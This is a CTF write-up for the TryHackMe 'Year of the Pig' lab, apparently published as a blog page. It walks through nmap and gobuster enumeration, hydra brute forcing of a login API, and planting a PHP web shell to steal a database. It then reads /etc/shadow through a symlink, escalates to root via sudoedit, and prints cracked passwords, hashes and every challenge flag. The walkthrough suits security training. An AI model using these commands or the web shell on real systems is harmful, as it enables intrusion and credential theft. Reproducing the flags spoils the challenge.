@@ -1,0 +1,502 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Year of the Pig | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Year of the Pig TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/year-of-the-pig/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/year-of-the-pig/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Year of the Pig"><meta property="og:description" content="Year of the Pig TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/year-of-the-pig/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Year of the Pig"><meta name=twitter:description content="Year of the Pig TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Year of the Pig","item":"https://s4ch.github.io/writeups/tryhackme/year-of-the-pig/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Year of the Pig","name":"Year of the Pig","description":"Year of the Pig TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Some pigs do fly…\nYear of the Pig\n💢 We will cover the topics Network Enumeration Web Enumeration Brute Forcing (http-get) Local File Inclusion SQL Enumeration Misconfigured Binaries Task 1 Flags Some pigs fly, and some have stories to tell. Get going!\nNB: Please do not stream this room until two days after release.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 kali@kali:~/CTFs/tryhackme/Year of the Pig$ sudo nmap -A -sS -sC -sV -O 10.10.22.166 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 17:31 CET WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? WARNING: RST from 10.10.22.166 port 22 -- is this port really open? Nmap scan report for 10.10.22.166 Host is up (0.033s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Marco's Blog No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/25%OT=22%CT=1%CU=39270%PV=Y%DS=2%DC=T%G=Y%TM=5F95A8 OS:94%P=x86_64-pc-linux-gnu)SEQ(CI=Z%II=I)OPS(O1=M508ST11NW7%O2=%O3=%O4=%O5 OS:=%O6=)WIN(W1=F4B3%W2=0%W3=0%W4=0%W5=0%W6=0)ECN(R=Y%DF=Y%T=40%W=0%O=%CC=N OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=4 OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0% OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z% OS:A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G% OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 32.58 ms 10.8.0.1 2 32.66 ms 10.10.22.166 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 kali@kali:~/CTFs/tryhackme/Year of the Pig$ gobuster dir -u http://10.10.22.166/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.22.166/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2020/10/25 17:34:05 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.html (Status: 403) /.htaccess.php (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.html (Status: 403) /admin (Status: 301) /api (Status: 301) /assets (Status: 301) /css (Status: 301) Progress: 7375 / 20470 (36.03%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/10/25 17:35:46 Finished =============================================================== http://10.10.22.166/login.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /api/login HTTP/1.1 Host: 10.10.22.166 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.22.166/login.php Content-Type: text/plain;charset=UTF-8 Origin: http://10.10.22.166 Content-Length: 64 Connection: close {\"username\":\"asd\",\"password\":\"7815696ecbf1c96e6894b779456d330e\"} 1 2 3 4 5 6 7 8 HTTP/1.1 200 OK Date: Sun, 25 Oct 2020 16:40:05 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 63 Connection: close Content-Type: text/html; charset=UTF-8 {\"Response\":\"Error\",\"Verbose\":\"Incorrect Username or Password\"} Remember that passwords should be a memorable word, followed by two numbers and a special character\n1 2 3 4 5 6 7 8 9 10 # Wordlist mode rules [List.Rules:Wordlist] # Try words as they are : # Lowercase every pure alphanumeric word -c \u003e3 !?X l Q # Capitalize every pure alphanumeric word -c (?a \u003e2 !?X c Q # Lowercase and pluralize pure alphabetic words \u003c* \u003e2 !?A l p 1 2 3 kali@kali:~/CTFs/tryhackme/Year of the Pig$ john -w=wordlist.txt --rules --stdout \u003e capitalised-list Using default input encoding: UTF-8 Press 'q' or Ctrl-C to abort, almost any other key for status 1 2 3 4 5 # Wordlist mode rules [List.Rules:Wordlist] # Try words as they are #: $[0-9]$[0-9]$[!.?,] 1 2 3 4 kali@kali:~/CTFs/tryhackme/Year of the Pig$ john -w=capitalised-list --rules --stdout \u003e mutated-list Using default input encoding: UTF-8 Press 'q' or Ctrl-C to abort, almost any other key for status 3498064p 0:00:00:01 100.00% (2020-10-25 17:46) 2332Kp/s Plugineding 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 kali@kali:~/CTFs/tryhackme/Year of the Pig$ hydra -l marco -P hashed-list 10.10.22.166 http-post-form \"/api/login:{\\\"username\\\"\\:\\\"^USER^\\\",\\\"password\\\"\\:\\\"^PASS^\\\"}:F=Incorrect\" -I Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 17:52:47 [INFORMATION] escape sequence \\: detected in module option, no parameter verification is performed. [DATA] max 16 tasks per 1 server, overall 16 tasks, 3498064 login tries (l:1/p:3498064), ~218629 tries per task [DATA] attacking http-post-form://10.10.22.166:80/api/login:{\"username\"\\:\"^USER^\",\"password\"\\:\"^PASS^\"}:F=Incorrect [80][http-post-form] host: 10.10.22.166 login: marco password: b0efb8ae58114b5bfc6c49a8124e2cdf [80][http-post-form] host: 10.10.22.166 login: marco password: c6147f769ab7c56f89c2f08dc168ee18 [80][http-post-form] host: 10.10.22.166 login: marco password: 21655f352dc05a9999b10295cd3c937b [80][http-post-form] host: 10.10.22.166 login: marco password: 547f64704e1d834ee7d1f1a4945f27ce [80][http-post-form] host: 10.10.22.166 login: marco password: 12ed6322e0e85588f13a77e361d76add [80][http-post-form] host: 10.10.22.166 login: marco password: 653b5a50bf95eb258d305a4548e308e3 [80][http-post-form] host: 10.10.22.166 login: marco password: ccc3c41b45dc75b1f4fc98a5573abcb8 [80][http-post-form] host: 10.10.22.166 login: marco password: 42fd83254c7f4c059a33d067ac067031 [80][http-post-form] host: 10.10.22.166 login: marco password: 9e77aa660403845238431a49ed35b6a4 [80][http-post-form] host: 10.10.22.166 login: marco password: db2b3cc37850ec719f9ad9999cbe6bce [80][http-post-form] host: 10.10.22.166 login: marco password: a594e5cc1c89be2915fcbdb32b6c5569 [80][http-post-form] host: 10.10.22.166 login: marco password: 3f07d7f2a4ab78c903de1259f15e4b06 [80][http-post-form] host: 10.10.22.166 login: marco password: b6b715b91687324a2e2cd5f8318a8016 [80][http-post-form] host: 10.10.22.166 login: marco password: 416f9f1ed896ca81f871347bd7995227 [80][http-post-form] host: 10.10.22.166 login: marco password: e58b14a77c7b19958a086092e57998ed [80][http-post-form] host: 10.10.22.166 login: marco password: 3347a5b5f16e4af642e8a1b21d047db7 1 of 1 target successfully completed, 16 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 17:52:49 1 wfuzz -w hashed-list -H \"User-Agent: Bypass\" -X POST -d '{\"username\":\"marco\",\"password\":\"FUZZ\"}' -u http://10.10.22.166/api/login --hh 63 1 2 kali@kali:~/CTFs/tryhackme/Year of the Pig$ sed -n '705943p' mutated-list savoia21! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/CTFs/tryhackme/Year of the Pig$ ssh marco@10.10.22.166 The authenticity of host '10.10.22.166 (10.10.22.166)' can't be established. ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.22.166' (ECDSA) to the list of known hosts. marco@10.10.22.166's password: __ __ __ _ _ ____ _ \\ \\ / /__ __ _ _ __ ___ / _| | |_| |__ ___ | _ \\(_) __ _ \\ V / _ \\/ _` | '__| / _ \\| |_ | __| '_ \\ / _ \\ | |_) | |/ _` | | | __/ (_| | | | (_) | _| | |_| | | | __/ | __/| | (_| | |_|\\___|\\__,_|_| \\___/|_| \\__|_| |_|\\___| |_| |_|\\__, | |___/ marco@year-of-the-pig:~$ ls flag1.txt marco@year-of-the-pig:~$ cat flag1.txt THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl} 1 2 marco@year-of-the-pig:~$ id uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers) 1 echo '\u003c?php system($_GET['c']); ?\u003e' \u003e /var/www/html/test.php \u0026\u0026 chmod 777 /var/www/html/test.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kali@kali:~/CTFs/tryhackme/Year of the Pig$ curl http://10.10.22.166/test.php?c=cat%20/var/www/admin.db \u003e admin.db % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 20481 0 20481 0 0 198k 0 --:--:-- --:--:-- --:--:-- 200k kali@kali:~/CTFs/tryhackme/Year of the Pig$ file admin.db admin.db: SQLite 3.x database, last written using SQLite version 3022000 kali@kali:~/CTFs/tryhackme/Year of the Pig$ sqlite3 admin.db SQLite version 3.31.1 2020-01-27 19:55:54 Enter \".help\" for usage hints. sqlite\u003e .tables sessions users sqlite\u003e show * from users ...\u003e ; Error: near \"show\": syntax error sqlite\u003e select * from users; 58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac f64ccfff6f64d57b121a85f9385cf256|curtis|a80bfe309ecaafcea1ea6cb3677971f2 sqlite\u003e a80bfe309ecaafcea1ea6cb3677971f2 md5 Donald1983$\n1 2 3 4 5 6 marco@year-of-the-pig:~$ su - curtis Password: curtis@year-of-the-pig:~$ ls flag2.txt curtis@year-of-the-pig:~$ cat flag2.txt THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh} 1 2 marco@year-of-the-pig:~$ cd /var/www/html/ \u0026\u0026 mkdir -p temp/temp marco@year-of-the-pig:/var/www/html$ ln -s /etc/shadow /var/www/html/temp/temp/config.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 root:$6$6Plj/ZBH$Lg5A8NArY2hvL437XI7wtkWFh9xTxpZdjzeeOxCSuCMMuJV.kR/vYa7QunnupHx4jkyk2L1gzA2C1pPELSUsP.:18490:0:99999:7::: daemon:*:17647:0:99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7::: sync:*:17647:0:99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: lp:*:17647:0:99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: uucp:*:17647:0:99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: backup:*:17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7::: messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: lxd:*:18490:0:99999:7::: uuidd:*:18490:0:99999:7::: dnsmasq:*:18490:0:99999:7::: landscape:*:18490:0:99999:7::: sshd:*:18490:0:99999:7::: pollinate:*:18490:0:99999:7::: marco:$6$5QVe.J7t$9U9.NEE.eYkUPtWPqx0rw7XJO5TkPd2Z4kwXOrXCir1SR91oUgt0uYAVL0bBxteJI2qvv.XPKQxSUaMtNw3pT/:18491:0:99999:7::: curtis:$6$8y/iqA1P$T1Q53Z3qIJclV.hgwB1E02jSgT2hAiqcHHS1nZiIVnqdG0lPOCYwVFZOGazVUpUQcpd9.8lfxR95m8zRAl.ns0:18495:0:99999:7::: 1 2 3 4 curtis@year-of-the-pig:~$ sudoedit /var/www/html/temp/temp/config.php curtis@year-of-the-pig:~$ sudo bash root@year-of-the-pig:/home/curtis# cat /root/root.txt THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0} Flag 1 THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}\nFlag 2 THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}\nRoot Flag THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}\n","wordCount":"1570","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/year-of-the-pig/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Year of the Pig</h1><div class=post-description>Year of the Pig TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1570 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-flags>Task 1 Flags</a></li></ul></nav></div></details></div><div class=post-content><p>Some pigs do fly&mldr;</p><p><a href=https://tryhackme.com/room/yearofthepig>Year of the Pig</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>Web Enumeration</li><li>Brute Forcing (http-get)</li><li>Local File Inclusion</li><li>SQL Enumeration</li><li>Misconfigured Binaries</li></ul><hr><h2 id=task-1-flags>Task 1 Flags<a hidden class=anchor aria-hidden=true href=#task-1-flags>#</a></h2><p>Some pigs fly, and some have stories to tell. Get going!</p><p><em>NB: Please do not stream this room until two days after release.</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Pig$ sudo nmap -A -sS -sC -sV -O 10.10.22.166
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 17:31 CET
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>WARNING: RST from 10.10.22.166 port 22 -- is this port really open?
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.22.166
+</span></span><span class=line><span class=cl>Host is up (0.033s latency).
+</span></span><span class=line><span class=cl>Not shown: 998 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: Marco&#39;s Blog
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/25%OT=22%CT=1%CU=39270%PV=Y%DS=2%DC=T%G=Y%TM=5F95A8
+</span></span><span class=line><span class=cl>OS:94%P=x86_64-pc-linux-gnu)SEQ(CI=Z%II=I)OPS(O1=M508ST11NW7%O2=%O3=%O4=%O5
+</span></span><span class=line><span class=cl>OS:=%O6=)WIN(W1=F4B3%W2=0%W3=0%W4=0%W5=0%W6=0)ECN(R=Y%DF=Y%T=40%W=0%O=%CC=N
+</span></span><span class=line><span class=cl>OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=4
+</span></span><span class=line><span class=cl>OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+</span></span><span class=line><span class=cl>OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%
+</span></span><span class=line><span class=cl>OS:A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
+</span></span><span class=line><span class=cl>OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 1723/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   32.58 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   32.66 ms 10.10.22.166
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
